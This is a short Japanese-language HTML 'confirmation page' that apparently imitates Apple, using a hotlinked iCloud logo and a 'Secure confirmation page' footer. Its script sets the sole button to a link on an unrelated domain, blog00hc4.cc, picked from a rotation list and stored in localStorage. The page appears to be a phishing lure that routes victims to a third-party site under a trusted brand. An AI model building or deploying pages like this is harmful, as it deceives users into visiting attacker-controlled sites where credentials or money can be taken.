<!doctype html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>確認ページ</title>

<style>
*{ box-sizing:border-box; }

body{
  margin:0;
  min-height:100vh;
  font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",sans-serif;
  background:linear-gradient(180deg,#f5f8ff 0%,#ffffff 55%,#f7f7f7 100%);
  color:#1d1d1f;
}

.wrap{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:24px;
}

.card{
  width:100%;
  max-width:430px;
  background:rgba(255,255,255,.85);
  backdrop-filter:blur(18px);
  border-radius:26px;
  padding:40px 28px 32px;
  text-align:center;
  box-shadow:0 18px 50px rgba(0,0,0,.08);
}

.logo{
  width:68px;
  height:68px;
  margin:0 auto 20px;
  border-radius:18px;
  overflow:hidden;
  box-shadow:0 6px 16px rgba(0,0,0,.08);
}

.logo img{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
}

h1{
  margin:0 0 12px;
  font-size:22px;
  font-weight:600;
}

p{
  margin:0 0 26px;
  font-size:14px;
  line-height:1.7;
  color:#555;
}

.btn{
  display:block;
  width:100%;
  padding:15px;
  border-radius:12px;
  background:#007aff;
  color:#fff;
  text-decoration:none;
  font-size:15px;
  font-weight:600;
  box-shadow:0 8px 18px rgba(0,122,255,.25);
}

.btn:active{
  transform:scale(.98);
}

.note{
  margin-top:16px;
  font-size:12px;
  color:#8a8a8e;
}

.footer{
  position:fixed;
  bottom:18px;
  width:100%;
  text-align:center;
  font-size:12px;
  color:#9a9a9a;
}
</style>
</head>

<body>

<div class="wrap">
  <div class="card">

    <div class="logo">
      <img src="https://s.mzstatic.com/email/images_shared/dItemArtiCloud_64_2x.jpg" alt="logo">
    </div>

    <h1>内容をご確認ください</h1>

    <p>
      続きの内容は、下のボタンからご確認いただけます。
    </p>

    <a id="confirmBtn" class="btn" href="#" target="_blank" rel="noopener noreferrer">
      詳細を確認する
    </a>

    <div class="note">
      ※ 自動転送は行われません。
    </div>

  </div>
</div>

<div class="footer">
  Secure confirmation page
</div>

<script>
const urls = [
  "blog00hc4.cc/cvbdsfrw",
  "blog00hc4.cc/cvbdsfrw",
  "blog00hc4.cc/cvbdsfrw",
  "blog00hc4.cc/cvbdsfrw"
];

const storageKey = "assigned_confirm_url_index";

let assignedIndex = localStorage.getItem(storageKey);

if (assignedIndex === null) {
  assignedIndex = Math.floor(Math.random() * urls.length);
  localStorage.setItem(storageKey, assignedIndex);
} else {
  assignedIndex = Number(assignedIndex);
}

document.getElementById("confirmBtn").href = urls[assignedIndex];

document.getElementById("confirmBtn").addEventListener("click", function(){
  this.href = urls[assignedIndex];
});
</script>

</body>
</html>
